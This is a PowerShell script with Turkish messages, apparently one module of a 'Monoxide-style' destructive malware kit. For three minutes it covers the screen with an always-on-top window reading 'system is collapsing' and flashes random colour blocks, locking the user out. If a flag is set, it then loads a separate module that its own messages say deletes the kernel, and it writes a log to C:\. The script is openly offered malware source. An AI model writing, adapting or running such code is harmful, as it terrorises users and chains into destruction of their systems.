# ============================================================
# EN – 3 DAKİKA GÖRSEL ÇÖKÜŞ (MONOXIDE TARZI)
# ============================================================

try {
    Write-Host "[EN] Görsel çöküş başlatılıyor..." -ForegroundColor Red
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'

    $label = New-Object System.Windows.Forms.Label
    $label.Dock = 'Fill'
    $label.Font = New-Object System.Drawing.Font('Consolas', 40, [System.Drawing.FontStyle]::Bold)
    $label.TextAlign = 'MiddleCenter'
    $label.ForeColor = 'White'
    $label.Text = 'SİSTEM ÇÖKÜYOR'
    $form.Controls.Add($label)

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 50
    $timer.Add_Tick({
        try {
            # Pixsellesme efekti (büyük renkli bloklar)
            $g = $form.CreateGraphics()
            for ($i=0; $i -lt 400; $i++) {
                $x = Get-Random -Min 0 -Max $form.Width
                $y = Get-Random -Min 0 -Max $form.Height
                $w = Get-Random -Min 10 -Max 200
                $h = Get-Random -Min 10 -Max 200
                $r = Get-Random -Min 0 -Max 256
                $g2 = Get-Random -Min 0 -Max 256
                $b = Get-Random -Min 0 -Max 256
                $renk = [System.Drawing.Color]::FromArgb($r, $g2, $b)
                $brush = New-Object System.Drawing.SolidBrush($renk)
                $g.FillRectangle($brush, $x, $y, $w, $h)
            }
            # Negatif renk efekti
            $label.ForeColor = [System.Drawing.Color]::FromArgb(
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256)
            )
            $label.BackColor = [System.Drawing.Color]::FromArgb(
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256)
            )
            $g.Dispose()
        } catch {}
    })
    $timer.Start()

    # 3 dakika bekle
    Start-Sleep -Seconds 180
    $timer.Stop()
    $form.Close()

    Write-Host "[EN] Görsel çöküş tamamlandı." -ForegroundColor Red

    # Kernel çökmemişse kernel sil
    if ($KERNEL_SIL -eq 1) {
        Write-Host "[EN] Kernel siliniyor..." -ForegroundColor Red
        . ./modul_kernel_ye.ps1
    }

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Görsel çöküş tamamlandı. Kernel durumu kontrol edildi."
} catch {
    Write-Host "[EN] Görsel çöküş hatası: $_" -ForegroundColor Red
}